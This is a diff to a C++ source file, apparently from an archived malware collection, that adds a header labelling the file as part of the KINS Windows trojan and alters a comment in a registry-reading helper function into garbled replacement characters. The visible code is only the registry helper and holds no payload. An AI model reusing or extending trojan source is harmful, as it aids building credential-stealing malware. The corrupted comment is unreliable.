@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include <intrin.h>
 #include <stdio.h>
 #include <windows.h>
@@ -260,7 +271,7 @@ DWORD Utils::_getValueAsBinaryEx(HKEY key, const LPSTR subKey, const LPSTR value
       if(bufferSize == 0)retVal = 0;
       else
       {
-        LPBYTE p = (LPBYTE)malloc(bufferSize + sizeof(WCHAR) * 2/*\0\0 äëÿ REG_*SZ*/);
+        LPBYTE p = (LPBYTE)malloc(bufferSize + sizeof(WCHAR) * 2/*\0\0 ï¿½ï¿½ï¿½ REG_*SZ*/);
         if(p != NULL)
         {
           if(RegQueryValueExA(key, value, NULL, type, p, &bufferSize) == ERROR_SUCCESS)
